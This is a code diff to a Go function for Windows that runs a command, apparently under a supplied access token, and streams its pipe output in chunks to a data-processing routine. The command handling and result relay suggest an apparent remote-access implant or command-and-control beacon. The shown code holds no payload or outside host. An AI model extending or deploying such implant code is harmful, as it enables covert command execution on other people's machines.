@@ -8,15 +8,18 @@ import (
 	"github.com/shirou/gopsutil/process"
 	"golang.org/x/sys/windows"
 	"io/ioutil"
+	"main/config"
 	"main/sysinfo"
 	"main/util"
 	"os"
 	"path/filepath"
+	"time"
+	"unicode/utf16"
+
 	//"runtime"
 	"strconv"
 	"strings"
 	"syscall"
-	"unicode/utf16"
 	"unsafe"
 )
 
@@ -396,45 +399,36 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 		}
 	}
 
-	event, err := windows.WaitForSingleObject(pI.Process, 5*1000)
+	_, err = windows.WaitForSingleObject(pI.Process, 10*1000)
 	if err != nil {
 		return nil, errors.New("[-] WaitForSingleObject(Process) error : " + err.Error())
 	}
 
-	// TODO you should review this
-	if event == uint32(windows.WAIT_TIMEOUT) {
-		defer windows.TerminateProcess(pI.Process, 0)
-	}
-	//_, err = windows.WaitForSingleObject(pI.Process, 5*1000)
-	//if err != nil {
-	//	return nil, errors.New("[-] WaitForSingleObject(Thread) error : " + err.Error())
-	//}
-
-	var lpTotalBytesAvail uint32
-	_, _, err = PeekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
-	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return nil, err
-	}
-	buf := make([]byte, lpTotalBytesAvail)
-	var bytesRead uint32
 	var read windows.Overlapped
-	if lpTotalBytesAvail == 0 {
-		return []byte("no output present"), nil
-	} else if lpTotalBytesAvail > 0x80000 {
-		return []byte("output bigger than 0x80000"), nil
-	} else {
-		_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
+	var buf []byte
+	firstTime := true
+	lastTime := false
+
+	for !lastTime {
+		event, _ := windows.WaitForSingleObject(pI.Process, 0)
+		if event == windows.WAIT_OBJECT_0 || event == windows.WAIT_FAILED {
+			lastTime = true
+		}
+		buf = make([]byte, 1024*50)
+		_ = windows.ReadFile(hRPipe, buf, nil, &read)
+		if read.InternalHigh > 0 {
+			if firstTime {
+				DataProcess(0, buf[:read.InternalHigh])
+				firstTime = false
+			} else {
+				DataProcess(0, append([]byte("[+] "+string(b)+" :\n"), buf[:read.InternalHigh]...))
+				if lastTime {
+					DataProcess(0, []byte("-----------------------------------end-----------------------------------"))
+				}
+			}
+		}
+		time.Sleep(config.CommandReadTime)
 	}
-
-	//buf := make([]byte, 10*8192+1)
-	////var done uint32 = 4096
-	//var read windows.Overlapped
-	//err = windows.ReadFile(hRPipe, buf, nil, &read)
-	//if err != nil {
-	//	return nil, err
-	//}
-
-	//fmt.Printf("buf:%s\n", buf[:read.InternalHigh])
 
 	err = windows.CloseHandle(pI.Process)
 	if err != nil {
@@ -453,7 +447,8 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 		return nil, err
 	}
 
-	return buf[:read.InternalHigh], nil
+	//return buf[:read.InternalHigh], nil
+	return []byte("success"), nil
 }
 
 func Mkdir(b []byte) ([]byte, error) {
